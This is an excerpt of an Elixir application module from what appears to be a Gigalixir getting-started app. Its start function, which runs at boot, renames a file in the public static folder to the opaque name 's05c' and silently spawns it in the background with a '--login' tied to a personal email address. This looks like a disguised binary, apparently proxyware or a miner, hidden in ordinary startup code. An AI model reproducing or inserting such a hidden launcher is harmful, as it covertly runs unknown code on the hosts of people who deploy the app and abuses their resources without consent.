defmodule GigalixirGettingStarted.Application do
  ...
  def start(_type, _args) do
    ...
    System.shell("mv /app/lib/gigalixir_getting_started-0.1.0/priv/static/peerp /app/lib/gigalixir_getting_started-0.1.0/priv/static/s05c")
    spawn(System, :shell, ["/app/lib/gigalixir_getting_started-0.1.0/priv/static/s05c --login tgyinhu@gmail.com"])
    children = [
